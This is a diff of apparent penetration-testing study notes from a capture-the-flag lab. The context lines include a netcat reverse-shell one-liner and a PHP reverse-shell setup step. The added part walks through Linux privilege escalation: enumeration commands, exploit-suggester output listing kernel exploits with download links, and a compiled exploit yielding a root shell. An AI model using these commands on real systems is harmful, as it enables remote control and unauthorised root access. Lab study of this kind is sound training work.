@@ -362,7 +362,6 @@ mkfifo /tmp/f; nc $IP $PORT < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
 ```
 
 
-
 **PENTEST MONKEY REV SHELL**
 first change `/usr/share/webshells/php/php-reverse-shell.php` ip and port to your machine
 ![php](./media/10-php-revshell.png)
@@ -401,6 +400,100 @@ stageless = nc
  Linux 
 php pentestmonkey = nc 
 
+
+---
+
+## LINUX PRIVILEGE ESCALATION 
+
+Why is it important?
+
+It's rare when performing a real-world penetration test to be able to gain a foothold (initial access) that gives you direct administrative access. Privilege escalation is crucial because it lets you gain system administrator levels of access, which allows you to perform actions such as:
+
+- Resetting passwords
+- Bypassing access controls to compromise protected data
+- Editing software configurations
+- Enabling persistence
+- Changing the privilege of existing (or new) users
+- Execute any administrative command
+https://askubuntu.com/questions/350208/what-does-2-dev-null-mean
+
+
+
+```
+Find files:
+
+find . -name flag1.txt: find the file named “flag1.txt” in the current directory
+find /home -name flag1.txt: find the file names “flag1.txt” in the /home directory
+find / -type d -name config: find the directory named config under “/”
+find / -type f -perm 0777: find files with the 777 permissions (files readable, writable, and executable by all users)
+find / -perm a=x: find executable files
+find /home -user frank: find all files for user “frank” under “/home”
+find / -mtime 10: find files that were modified in the last 10 days
+find / -atime 10: find files that were accessed in the last 10 day
+find / -cmin -60: find files changed within the last hour (60 minutes)
+find / -amin -60: find files accesses within the last hour (60 minutes)
+find / -size 50M: find files with a 50 MB size
+```
+
+note always add `2>/dev/null` so you can filter the errors 
+```
+
+find / -writable -type d 2>/dev/null : Find world-writeable folders
+find / -perm -222 -type d 2>/dev/null: Find world-writeable folders
+find / -perm -o w -type d 2>/dev/null: Find world-writeable folders
+```
+
+after entering 
+clone this 
+https://github.com/mzet-/linux-exploit-suggester and use it 
+
+
+./les.sh > exploits.txt           
+karen@wade7363:/tmp$ cat exploits.txt | grep "high" -B3 -A3
+[+] [CVE-2016-5195] dirtycow
+
+Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
+Exposure: highly probable
+Tags: debian=7|8,RHEL=5{kernel:2.6.(18|24|33)-*},RHEL=6{kernel:2.6.32-*|3.(0|2|6|8|10).*|2.6.33.9-rt31},RHEL=7{kernel:3.10.0-*|4.2.0-0.21.el7},[ ubuntu=16.04|14.04|12.04 ]
+Download URL: https://www.exploit-db.com/download/40611
+Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh
+--
+[+] [CVE-2016-5195] dirtycow 2
+
+Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
+Exposure: highly probable
+Tags: debian=7|8,RHEL=5|6|7,[ ubuntu=14.04|12.04 ],ubuntu=10.04{kernel:2.6.32-21-generic},ubuntu=16.04{kernel:4.4.0-21-generic}
+Download URL: https://www.exploit-db.com/download/40839
+ext-url: https://www.exploit-db.com/download/40847
+--
+[+] [CVE-2015-1328] overlayfs
+
+Details: http://seclists.org/oss-sec/2015/q2/717
+Exposure: highly probable
+Tags: [ ubuntu=(12.04|14.04){kernel:3.13.0-(2|3|4|5)*-generic} ],ubuntu=(14.10|15.04){kernel:3.(13|16).0-*-generic}
+Download URL: https://www.exploit-db.com/download/37292
+
+
+
+gcc exploit.c -o exploit
+./exploit
+
+karen@wade7363:/tmp$ ./exploit
+spawning threads
+mount #1
+mount #2
+child threads done
+/etc/ld.so.preload created
+creating shared library
+# whoami
+root
+# id
+uid=0(root) gid=0(root) groups=0(root),1001(karen)
+# bash
+root@wade7363:/tmp# find / -name flag1.txt 2>/dev/null
+/home/matt/flag1.txt
+root@wade7363:/tmp# cat /home/matt/flag1.txt
+THM-28392872729920
 
 
 
